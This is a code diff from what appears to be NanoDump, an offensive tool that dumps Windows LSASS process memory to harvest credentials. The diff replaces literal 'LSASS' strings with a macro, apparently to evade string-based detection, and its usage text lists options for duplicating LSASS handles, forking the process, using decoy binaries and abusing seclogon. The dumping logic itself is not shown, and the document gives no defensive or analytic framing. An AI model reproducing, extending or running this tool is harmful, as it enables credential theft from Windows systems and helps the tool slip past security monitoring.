@@ -56,12 +56,12 @@ void go(char* args, int length)
     }
     else
     {
-        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
     }
 
     if (get_pid_and_leave)
     {
-        PRINT("LSASS PID: %ld", lsass_pid);
+        PRINT(LSASS " PID: %ld", lsass_pid);
         return;
     }
 
@@ -220,7 +220,7 @@ void usage(char* procname)
 {
     PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
     PRINT("    --getpid");
-    PRINT("            print the PID of LSASS and leave");
+    PRINT("            print the PID of " LSASS " and leave");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
     PRINT("    --valid, -v");
@@ -228,9 +228,9 @@ void usage(char* procname)
     PRINT("    --fork, -f");
     PRINT("            fork target process before dumping");
     PRINT("    --dup, -d");
-    PRINT("            duplicate an existing LSASS handle");
+    PRINT("            duplicate an existing " LSASS " handle");
     PRINT("    --malseclogon, -m");
-    PRINT("            obtain a handle to LSASS by (ab)using seclogon");
+    PRINT("            obtain a handle to " LSASS " by (ab)using seclogon");
     PRINT("    --binary BIN_PATH, -b BIN_PATH");
     PRINT("            full path to the decoy binary used with --dup and --malseclogon");
     PRINT("    --help, -h");
@@ -371,12 +371,12 @@ int main(int argc, char* argv[])
     }
     else
     {
-        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
     }
 
     if (get_pid_and_leave)
     {
-        PRINT("LSASS PID: %ld", lsass_pid);
+        PRINT(LSASS " PID: %ld", lsass_pid);
         return 0;
     }
 
@@ -555,11 +555,11 @@ int main(int argc, char* argv[])
 BOOL NanoDump(void)
 {
     LPCSTR  dump_path = "C:\\Windows\\Temp\\nano.dmp";
+    BOOL    use_valid_sig = FALSE;
     ULONG32 Signature;
     SHORT   Version;
     SHORT   ImplementationVersion;
     BOOL    success;
-    BOOL    use_valid_sig = FALSE;
     wchar_t wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
     full_dump_path.Buffer = wcFilePath;
